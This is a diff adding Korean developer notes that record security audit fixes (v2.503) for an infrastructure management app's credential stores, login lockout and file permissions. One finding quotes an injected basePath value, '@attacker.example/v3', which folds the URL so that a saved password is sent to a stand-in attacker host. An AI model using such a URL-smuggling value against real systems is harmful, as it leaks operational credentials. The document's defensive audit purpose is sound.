@@ -362,3 +362,34 @@
   다음 호출부가 vCenter/VM 문자열을 그대로 넘길 수 있다 — 세그먼트 `..`·드라이브 문자를 거부한다.
 - **동시 실행 가드의 409 응답에 타 사용자 계정명을 싣지 말 것**(`routes/api/toolsCapacity.js`, H/L-2):
   tools 권한만 있는 계정이 연타해 관리자 로그인 ID 를 알아내는 계정 열거 단서다(본인일 때만 표기).
+
+## 2026-09-13 성능·보안 전수조사(v2.503) 조치 — 되돌리지 말 것 (docs/PERF-AUDIT-2026-09-13.md)
+
+성능 5도메인 + 보안 2도메인 병렬 감사. 회귀 테스트: `test/audit2503.test.js`(16건).
+
+- **idKeys 는 '최종 요청 URL 을 만드는 모든 필드' 다**(`proxy/registry.js`, S-1 high): v2.500 은
+  Data Plane 의 idKeys 를 `['url']` 로 뒀는데, 실제 요청 주소는 `proxy/dataplane.js base()` 에서
+  `url + (basePath || '/v3') + '/services/haproxy'` 로 **문자열 연결**된다. 그래서
+  `{basePath:'@attacker.example/v3', password:'********'}` 로 저장하면 `accessMoved` 가 거짓이라
+  비밀번호가 승계되고, 조립된 주소는 앞부분이 **userinfo 로 접혀** 호스트가 공격자 것이 된다
+  (`new URL(...).host === 'attacker.example'` 실측). 이제 `DP_ID_KEYS=['url','basePath']` 이고
+  `basePathIssue()` 가 `@`·`//`·`?`·`#`·공백·제어문자·비-`/` 시작을 거부한다. **새 스토어의 idKeys 를
+  고를 때 호스트 필드만 넣지 말 것** — 경로 조각·포트·계정 등 요청 대상을 바꿀 수 있는 필드 전부다.
+- **`util/secretCarry.js` 는 자격증명 스토어 **전부**에 적용한다**(S-2): v2.500 이 세 곳만 고치고
+  나머지를 '추정' 으로 남겼는데, 재감사에서 `vcenter/registry.js`·`nsx/registry.js`·`idrac/registry.js`·
+  `horizon/horizon.js`(host/username[/domain] 변경) · `collector/registry.js`(url 변경 → **수집 토큰**) ·
+  `gpu/physicalRegistry.js`(host/port/username 변경 → SSH 비번)에서 **코드로 확인**됐다. 저장 요청
+  1회로 접속처만 바꾸면 다음 수집에서 운영 자격증명이 그 호스트로 평문 전송된다. 새 스토어를
+  만들면 여기에 추가할 것 — 회귀 테스트가 이 6개 파일의 import 를 검사한다.
+- **역할별 축약은 하위 객체까지 가린다**(`proxy/registry.js getConfigSafe`, S-3): `{...c}` 뒤에
+  최상위만 덮어쓰면 `c.proxies[]` 하위 비밀이 그대로 나간다(v2.500 D/M1 relaycheck 과 같은 원인).
+  `normalizeProxy` → `redactProxy` 순서를 지킬 것(구버전 항목에 dataplane 이 없으면 redact 가 던진다).
+- **계정 무관 로그인 잠금의 출발지는 `clientIp(req)`, 잠금은 짧게**(`security/loginRateLimit.js` ·
+  `routes/auth.js`, S-4): v2.500 이 추가한 `ip:` 카운터는 ① `req.socket.remoteAddress` 고정이라
+  리버스 프록시 뒤에서 **전 사용자가 한 키를 공유**했고 ② 일단 잠기면 `checkLoginAllowed` 가 시도
+  자체를 막아 "정상 로그인 1회가 리셋한다" 는 **발동할 수 없었다**(자기지속) → 48회 실패로 15분
+  전체 로그인 마비. 이제 출발지는 전역 레이트리밋과 같은 `clientIp(req)`(trust proxy 규약, v2.428)이고
+  이 레이어만 `LOGIN_IP_LOCKOUT_MS`(기본 60초)로 분리한다. 계정을 아는 브루트포스는 per-IP+계정
+  (8회/15분)·계정 전역(80회/15분)이 그대로 막는다. **이 분리를 없애 LOCKOUT_MS 로 되돌리지 말 것.**
+- **DB 파일은 예외 없이 `chmod 0600`**(`guestdisk/db.js`, S-5): v2.447 에서 12개 모듈에 일괄
+  적용한 규약인데 v2.459 신규 파일만 빠져 있었다. 새 SQLite 모듈에도 반드시 넣을 것.
